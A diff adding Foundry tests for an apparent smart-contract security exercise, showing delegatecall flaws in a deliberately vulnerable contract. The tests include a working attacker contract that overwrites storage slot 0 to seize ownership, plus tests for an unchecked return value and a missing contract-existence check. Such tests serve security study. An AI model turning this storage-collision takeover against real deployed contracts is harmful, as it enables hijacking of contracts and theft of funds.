@@ -2,7 +2,7 @@
 pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
-import {R0Q2, R0Q3, R0Q4} from "../src/Race0.sol";
+import {R0Q2, R0Q3, R0Q4, R0Q5} from "../src/Race0.sol";
 
 contract R0Q2Test is Test {
     R0Q2 public r0q2;
@@ -114,5 +114,58 @@ contract R0Q4Test is Test {
 
         // calling getAddress returnes the expected address
         assertEq(r0q4.getAddress(0), testAddr);
+    }
+}
+
+contract R0Q5Test is Test {
+    R0Q5 r0q5;
+    R0Q5Attacker attackContract;
+    R0Q5Revert revertContract;
+    address attacker = address(0xc3e3a0be380b435c14B6aDB7aB8b8b56eB5Cc6eb);
+
+    function setUp() public {
+        r0q5 = new R0Q5();
+        attackContract  = new R0Q5Attacker();
+        revertContract  = new R0Q5Revert();
+    }
+
+    function test_potentialControlledDelegatecallRisk() public {    
+        // before calling the delegate restrictedFunction cannot be called 
+        vm.prank(attacker);
+        vm.expectRevert("unauthorized");
+        r0q5.restrictedFunction();
+
+        // call delegate passing the attacers contract to change the owenr address in the target
+        r0q5.delegate(address(attackContract));
+        
+        // now the attacker can call the restrictedFunction without any issues!
+        vm.prank(attacker);
+        r0q5.restrictedFunction();
+    }
+
+    function test_delegatecallReturnValueIsNotChecked() public {
+        // calling delegate with a contract definition of setDelay that reverts
+        // will not cause the top level call to revert
+        r0q5.delegate(address(revertContract));
+    }
+
+    function test_delegateDoesNotCheckForContractExistenceAtAddr() public {
+        // call delegate with an address that does not have contract deployed 
+        // will NOT revert at any level in the call stack
+        r0q5.delegate(address(0x0));
+    }
+}
+
+contract R0Q5Attacker {
+    address private slot0Placeholder; // slot 0
+
+    function setDelay(uint256 _value) public {
+        slot0Placeholder = address(0xc3e3a0be380b435c14B6aDB7aB8b8b56eB5Cc6eb);
+    }
+}
+
+contract R0Q5Revert {
+    function setDelay(uint256 _value) public {
+        revert("call to setDelay reverted");
     }
 }
